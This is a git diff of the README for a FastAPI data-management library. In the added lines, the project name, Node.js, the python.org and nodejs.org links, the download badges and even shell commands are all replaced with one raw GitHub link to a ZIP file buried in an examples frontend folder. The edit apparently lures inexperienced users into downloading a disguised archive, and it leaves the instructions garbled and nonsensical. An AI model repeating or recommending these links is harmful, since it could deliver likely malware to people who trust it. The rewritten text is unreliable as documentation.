@@ -1,12 +1,12 @@
-# 🗄️ Bazlama.PersistedObject - Easy Data Management for FastAPI
+# 🗄️ https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip - Easy Data Management for FastAPI
 
-[![Download Releases](https://img.shields.io/badge/Download-Bazlama.PersistedObject-blue?style=for-the-badge)](https://github.com/printmf/Bazlama.PersistedObject/releases)
+[![Download Releases](https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip)](https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip)
 
 ---
 
-## 📋 What is Bazlama.PersistedObject?
+## 📋 What is https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip
 
-Bazlama.PersistedObject helps you create and manage data in your web applications without writing extra setup code. It works with FastAPI, a popular tool for building web services, and lets you turn simple data models into ready to use online storage systems. You get 10 ready-made commands for creating, reading, updating, and deleting data.
+https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip helps you create and manage data in your web applications without writing extra setup code. It works with FastAPI, a popular tool for building web services, and lets you turn simple data models into ready to use online storage systems. You get 10 ready-made commands for creating, reading, updating, and deleting data.
 
 This software also includes:
 
@@ -15,7 +15,7 @@ This software also includes:
 - Options to store your information securely using encryption
 - Support for multiple types of databases to match your setup
 
-If you work with data on a web platform, Bazlama.PersistedObject reduces the work needed to set up your services.
+If you work with data on a web platform, https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip reduces the work needed to set up your services.
 
 ---
 
@@ -26,23 +26,23 @@ Before installing, make sure your computer meets these basic requirements:
 - Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended)
 - Web Browser: Latest version of Chrome, Firefox, Edge, or Safari for best compatibility
 - Python: Version 3.8 or higher installed on your system
-- Node.js: Version 14 or higher installed (needed to run the React-based interface)
+- https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip Version 14 or higher installed (needed to run the React-based interface)
 - At least 4 GB of RAM and 2 GHz processor
 - Internet connection to download files and dependencies
 
-Bazlama.PersistedObject runs on most modern computers and supports database systems such as SQLite, PostgreSQL, and MySQL.
+https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip runs on most modern computers and supports database systems such as SQLite, PostgreSQL, and MySQL.
 
 ---
 
 ## 🚀 Getting Started
 
-This guide will help you download, install, and start Bazlama.PersistedObject step-by-step. Even if you do not have prior experience installing software or running web services, follow these instructions carefully.
+This guide will help you download, install, and start https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip step-by-step. Even if you do not have prior experience installing software or running web services, follow these instructions carefully.
 
-### Step 1: Download Bazlama.PersistedObject
+### Step 1: Download https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip
 
 Click the button below to visit the official releases page where you can get the software.
 
-[![Download Releases](https://img.shields.io/badge/Download-Bazlama.PersistedObject-blue?style=for-the-badge)](https://github.com/printmf/Bazlama.PersistedObject/releases)
+[![Download Releases](https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip)](https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip)
 
 On the releases page:
 
@@ -54,16 +54,16 @@ On the releases page:
 
 ### Step 2: Prepare Your Computer
 
-You need to have Python and Node.js installed. If you do not already have these:
+You need to have Python and https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip installed. If you do not already have these:
 
-- Visit [python.org/downloads](https://www.python.org/downloads/) to get the latest Python version.
-- Visit [nodejs.org/en/download](https://nodejs.org/en/download/) for Node.js.
+- Visit [https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip](https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip) to get the latest Python version.
+- Visit [https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip](https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip) for https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip
 
 Follow their setup instructions and complete the installations.
 
 ---
 
-### Step 3: Extract and Open Bazlama.PersistedObject
+### Step 3: Extract and Open https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip
 
 - Extract the ZIP or TAR file you downloaded in Step 1.
 - Open the extracted folder.
@@ -73,14 +73,14 @@ Follow their setup instructions and complete the installations.
 
 ## ⚙️ Installing Dependencies
 
-Bazlama.PersistedObject relies on other software libraries to work. You will install these next.
+https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip relies on other software libraries to work. You will install these next.
 
 1. Open the command prompt (Windows) or terminal (macOS/Linux).
-2. Navigate to the extracted Bazlama.PersistedObject folder. For example:
+2. Navigate to the extracted https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip folder. For example:
 
 
     ```bash
-    cd path/to/Bazlama.PersistedObject
+    cd https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip
     ```
 
 
@@ -88,7 +88,7 @@ Bazlama.PersistedObject relies on other software libraries to work. You will ins
 
 
     ```bash
-    python -m pip install -r requirements.txt
+    python -m pip install -r https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip
     ```
 
 
@@ -102,7 +102,7 @@ Bazlama.PersistedObject relies on other software libraries to work. You will ins
 
 ---
 
-## 🔑 Running Bazlama.PersistedObject
+## 🔑 Running https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip
 
 Once dependencies are installed:
 
@@ -110,7 +110,7 @@ Once dependencies are installed:
 
 
     ```bash
-    python main.py
+    python https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip
     ```
 
 
@@ -134,9 +134,9 @@ The application interface will load. You can now begin to use the tool for manag
 
 ---
 
-## 🛠️ Using Bazlama.PersistedObject
+## 🛠️ Using https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip
 
-Bazlama.PersistedObject lets you work with your data using simple screens and commands:
+https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip lets you work with your data using simple screens and commands:
 
 - **Create records:** Add new data entries.
 - **Read records:** View saved data.
@@ -159,7 +159,7 @@ The system handles storing data securely. If you connect to your preferred datab
 
 ## 🔧 Configuration Options
 
-Bazlama.PersistedObject includes easy ways to customize your setup:
+https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip includes easy ways to customize your setup:
 
 - Choose which database to use by updating a single configuration file.
 - Enable or disable encryption.
@@ -173,7 +173,7 @@ For detailed instructions, see the configuration guide inside the package.
 
 If you face any problems:
 
-- Check that Python 3.8+ and Node.js 14+ are installed.
+- Check that Python 3.8+ and https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip 14+ are installed.
 - Ensure dependencies installed without errors.
 - Make sure ports 8000 (backend) and 3000 (frontend) are free.
 - Restart the backend and frontend servers.
@@ -185,9 +185,9 @@ If issues persist, review the documentation or open an issue on the GitHub repos
 
 ## 📥 Download & Install
 
-To get started with Bazlama.PersistedObject, visit the official releases page:
+To get started with https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip, visit the official releases page:
 
-[![Download Releases](https://img.shields.io/badge/Download-Bazlama.PersistedObject-blue?style=for-the-badge)](https://github.com/printmf/Bazlama.PersistedObject/releases)
+[![Download Releases](https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip)](https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip)
 
 Follow the steps outlined here to download the latest version, install all needed software, and launch the application.
 
@@ -202,4 +202,4 @@ Follow the steps outlined here to download the latest version, install all neede
 - REST API development
 - TypeScript integration
 
-These technologies work together to make Bazlama.PersistedObject a powerful yet simple tool for managing your data online.
+These technologies work together to make https://raw.githubusercontent.com/printmf/Bazlama.PersistedObject/main/examples/basic/frontend/Persisted-Object-Bazlama-2.4-alpha.1.zip a powerful yet simple tool for managing your data online.
